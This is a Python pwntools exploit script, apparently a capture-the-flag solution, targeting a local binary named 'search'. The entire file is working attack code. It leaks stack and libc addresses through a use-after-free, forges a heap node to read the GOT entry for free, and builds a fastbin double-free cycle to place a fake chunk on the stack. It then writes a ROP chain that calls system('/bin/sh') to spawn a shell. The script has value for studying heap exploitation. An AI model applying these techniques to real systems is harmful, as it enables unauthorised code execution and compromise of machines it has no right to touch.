#!/usr/bin/env python2

from pwn import *

context(arch="amd64", os="linux",log_level="debug")

p = process('./search')

pop_rdi_ret = 0x400e23
system_offset = 0x46590
puts_offset = 0x6fd60
binsh_offset = 1558723

def leak_stack():
    p.sendline('A'*48)
    p.recvuntil('Quit\n')
    p.recvline()

    # doesn't work all the time
    p.sendline('A'*48)
    leak = p.recvline().split(' ')[0][48:]
    return int(leak[::-1].encode('hex'), 16)

def leak_libc():
    # this sentence is the same size as a list node
    index_sentence(('a'*12 + ' b ').ljust(40, 'c'))

    # delete the sentence
    search('a' * 12)
    p.sendline('y')

    # the node for this sentence gets put in the previous sentence's spot.
    # note we made sure this doesn't reuse the chunk that was just freed by
    # making it 64 bytes
    index_sentence('d' * 64)

    # free the first sentence again so we can allocate something on top of it.
    # this will work because 1) the sentence no longer starts with a null byte
    # (in fact, it should be clear that it starts a pointer to 64 d's), and 2)
    # the location where our original string contained `b` is guaranteed to be
    # zero. this is because after the original sentence was zeroed out, nothing
    # was allocated at offset 12, which is just padding in the structure. if
    # we had made the first word in the string 16 bytes instead of 12, then that
    # would put 'b' at a location where it would not be guaranteed to be zero.
    search('\x00')
    p.sendline('y')

    # make our fake node
    node = ''
    node += p64(0x400E90) # word pointer "Enter"
    node += p64(5) # word length
    node += p64(0x602028) # sentence pointer (GOT address of free)
    node += p64(64) # length of sentence
    node += p64(0x00000000) # next pointer is null
    assert len(node) == 40

    # this sentence gets allocated on top of the previous sentence's node.
    # we can thus control the sentence pointer of that node and leak memory.
    index_sentence(node)

    # this simply receives all input from the binary and discards it, which
    # makes parsing out the leaked address easier below.
    p.clean()

    # leak the libc address
    search('Enter')
    p.recvuntil('Found 64: ')
    leak = u64(p.recvline()[:8])
    p.sendline('n') # deleting it isn't necessary
    return leak

def index_sentence(s):
    p.sendline('2')
    p.sendline(str(len(s)))
    p.sendline(s)

def search(s):
    p.sendline('1')
    p.sendline(str(len(s)))
    p.sendline(s)

def make_cycle():
    index_sentence('a'*54 + ' d')
    index_sentence('b'*54 + ' d')
    index_sentence('c'*54 + ' d')

    search('d')
    p.sendline('y')
    p.sendline('y')
    p.sendline('y')
    search('\x00')
    p.sendline('y')
    p.sendline('n')

def make_fake_chunk(addr):
    # set the fwd pointer of the chunk to the address we want
    fake_chunk = p64(addr)
    index_sentence(fake_chunk.ljust(56))

def allocate_fake_chunk(binsh_addr, system_addr):
    # allocate twice to get our fake chunk
    index_sentence('A'*56)
    index_sentence('B'*56)

    # overwrite the return address
    buf = 'A'*30
    buf += p64(pop_rdi_ret)
    buf += p64(binsh_addr)
    buf += p64(system_addr)
    buf = buf.ljust(56, 'C')

    index_sentence(buf)

def main():
    gdb.attach(p)
    stack_leak = leak_stack()

    # This makes stack_addr + 0x8 be 0x40
    stack_addr = stack_leak + 0x22 - 8

    log.info('stack leak: %s' % hex(stack_leak))
    log.info('stack addr: %s' % hex(stack_addr))

    libc_leak = leak_libc()
    libc_base = libc_leak - puts_offset
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset

    log.info('libc leak: %s' % hex(libc_leak))
    log.info('libc_base: %s' % hex(libc_base))
    log.info('system addr: %s' % hex(system_addr))
    log.info('binsh addr: %s' % hex(binsh_addr))

    make_cycle()
    make_fake_chunk(stack_addr)
    allocate_fake_chunk(binsh_addr, system_addr)

    p.interactive()

if __name__ == '__main__':
    main()